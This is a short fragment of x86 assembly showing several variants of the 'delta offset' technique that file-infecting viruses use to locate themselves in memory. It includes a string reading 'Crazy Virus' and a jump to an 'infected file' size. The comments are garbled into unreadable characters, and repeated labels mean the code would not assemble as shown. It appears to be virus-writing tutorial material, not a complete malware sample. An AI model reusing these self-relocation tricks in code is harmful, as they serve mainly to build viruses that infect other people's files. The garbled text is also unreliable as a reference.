call delta
delta:
        pop ebp
    sub ebp,offset delta


;��� ���� ������
d:      jmp c1
        x dw 0
c1:     lea ebp,x
        sub ebp,offset d
        sub ebp,2;� EBP - ������ ��������


;��� ���� ������2
d:      jmp c1
        x db "Hello!!! I'm Crazy Virus",0
c1:     lea ebp,x
        sub ebp,offset d
        sub ebp,2;� EBP - ������ ��������;


;��� ���� ������3
mov ebx,old_size_of_infected_file;���������� ������ �����, �� �������������
jmp ebx

;��� ���� ������4
m:      lea ebx,m
        sub ebx,offset m;� EBX - ������ ��������